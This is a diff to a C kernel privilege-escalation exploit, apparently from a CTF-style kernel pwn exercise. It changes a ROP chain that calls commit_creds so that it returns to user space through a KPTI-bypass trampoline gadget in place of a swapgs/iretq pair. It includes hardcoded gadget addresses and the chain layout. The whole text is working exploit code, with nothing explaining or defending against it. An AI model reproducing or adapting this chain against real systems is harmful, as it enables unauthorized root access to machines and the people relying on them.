@@ -10,8 +10,7 @@ unsigned long user_cs, user_ss, user_rsp, user_rflags;
 #define rop_pop_rdi               0xffffffff8127bbdc
 #define rop_pop_rcx               0xffffffff8132cdd3
 #define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
-#define rop_swapgs                0xffffffff8160bf7e
-#define rop_iretq                 0xffffffff810202af
+#define rop_bypass_kpti 0xffffffff81800e26
 
 void fatal(const char *msg) {
     perror(msg);
@@ -52,9 +51,10 @@ int main() {
     *chain++ = 0;
     *chain++ = rop_mov_rdi_rax_rep_movsq;
     *chain++ = commit_creds;
-    *chain++ = rop_swapgs;
-    *chain++ = rop_iretq;
-    *chain++ = (unsigned long) &win;
+    *chain++ = rop_bypass_kpti;
+    *chain++ = 0xdeadbeefcafebabe;
+    *chain++ = 0xdeadbeefcafebabe;
+    *chain++ = (unsigned long) win;
     *chain++ = user_cs;
     *chain++ = user_rflags;
     *chain++ = user_rsp;
